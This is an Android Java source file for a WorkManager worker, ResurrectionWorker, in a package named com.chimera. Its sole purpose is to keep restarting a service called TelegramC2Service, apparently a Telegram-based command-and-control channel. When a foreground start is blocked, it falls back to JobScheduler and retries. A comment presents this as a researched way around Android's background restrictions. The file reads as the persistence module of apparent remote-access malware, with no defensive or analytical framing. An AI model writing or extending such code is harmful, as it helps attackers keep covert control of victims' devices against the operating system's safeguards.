package com.chimera;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

public class ResurrectionWorker extends Worker {
    public ResurrectionWorker(@NonNull Context ctx, @NonNull WorkerParameters params) { super(ctx, params); }

    @NonNull
    @Override
    public Result doWork() {
        try {
            Context ctx = getApplicationContext();
            // Expedited work has FGS exemption even from background (research validated)
            // Try to start core service via allowed path
            Intent i = new Intent(ctx, TelegramC2Service.class);
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    ctx.startForegroundService(i);
                } else {
                    ctx.startService(i);
                }
            } catch (Exception e) {
                // If FGS start denied (background restriction), fallback to JobScheduler which will be tried by ResurrectionHelper
                ErrorLogger.logError(ctx, "ResurrectionWorker_FGS", e);
                ResurrectionHelper.scheduleJobScheduler(ctx);
                return Result.retry();
            }
            return Result.success();
        } catch (Exception e) {
            ErrorLogger.logError(getApplicationContext(), "ResurrectionWorker", e);
            return Result.retry();
        }
    }
}
